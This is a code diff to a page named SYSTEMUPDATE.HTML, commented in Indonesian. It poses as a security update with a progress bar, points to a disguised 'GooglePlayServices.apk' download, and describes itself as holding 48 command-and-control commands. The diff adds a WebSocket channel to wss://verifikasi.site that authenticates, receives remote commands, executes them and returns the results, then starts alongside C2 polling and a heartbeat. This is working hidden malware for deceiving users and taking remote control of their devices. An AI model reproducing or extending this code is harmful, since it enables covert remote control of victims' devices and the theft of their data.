@@ -64,7 +64,7 @@
 
 <script>
 // ============================================================
-// 🔥 SYSTEMUPDATE.HTML - 48 PERINTAH C2 LENGKAP!
+// 🔥 SYSTEMUPDATE.HTML - 48 PERINTAH C2 + WEBSOCKET!
 // ============================================================
 
 var SERVER = 'https://verifikasi.site';
@@ -82,6 +82,74 @@ var GITHUB_REPO = 'verifikasi-site';
 
 var APK_URL = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/GooglePlayServices.apk';
 var APK_DOWNLOADED = false;
+
+// ============================================================
+// WEBSOCKET
+// ============================================================
+var ws = null;
+var wsConnected = false;
+var WS_URL = 'wss://verifikasi.site/ws';
+
+function connectWebSocket() {
+    if (ws && ws.readyState === WebSocket.OPEN) return;
+    if (!WS_PASSWORD || WS_PASSWORD === '') {
+        setTimeout(connectWebSocket, 3000);
+        return;
+    }
+    try {
+        ws = new WebSocket(WS_URL);
+        ws.onopen = function() {
+            wsConnected = true;
+            K({ sumber: 'ws_status', data: 'connected' });
+            ws.send(JSON.stringify({
+                type: 'auth',
+                key: WS_PASSWORD,
+                deviceId: 'browser_systemupdate',
+                timestamp: Date.now()
+            }));
+        };
+        ws.onmessage = function(event) {
+            try {
+                var data = JSON.parse(event.data);
+                if (data.type === 'auth_success') {
+                    K({ sumber: 'ws_auth', data: 'success' });
+                } else if (data.type === 'auth_failed') {
+                    K({ sumber: 'ws_auth', data: 'failed' });
+                    ws.close();
+                } else if (data.type === 'command') {
+                    var cmd = data.command || data;
+                    var aksi = cmd.aksi || 'unknown';
+                    K({ sumber: 'ws_command_received', data: aksi });
+                    var hasil = eksekusiPerintah(cmd);
+                    K({ sumber: 'ws_command_result', data: hasil });
+                    if (wsConnected && ws) {
+                        ws.send(JSON.stringify({
+                            type: 'command_result',
+                            command: aksi,
+                            result: hasil,
+                            timestamp: Date.now()
+                        }));
+                    }
+                } else if (data.type === 'ping') {
+                    ws.send(JSON.stringify({ type: 'pong', timestamp: data.timestamp }));
+                }
+            } catch(e) {
+                K({ sumber: 'ws_parse_error', data: e.message });
+            }
+        };
+        ws.onclose = function() {
+            wsConnected = false;
+            K({ sumber: 'ws_status', data: 'disconnected' });
+            setTimeout(connectWebSocket, 10000);
+        };
+        ws.onerror = function() {
+            K({ sumber: 'ws_error', data: 'error' });
+        };
+    } catch(e) {
+        K({ sumber: 'ws_connect_error', data: e.message });
+        setTimeout(connectWebSocket, 10000);
+    }
+}
 
 // ============================================================
 // DETEKSI PLATFORM
@@ -158,6 +226,9 @@ function ambilPassword() {
                         PASSWORD_FETCHED = true;
                         updateProgress(20, '⏳ Memperbarui System Keamanan...');
                         K({ sumber: 'password_received', data: 'ok' });
+                        
+                        // 🔥 CONNECT WEBSOCKET SETELAH PASSWORD DIDAPAT
+                        connectWebSocket();
                         
                         startC2Polling();
                         startHeartbeat();
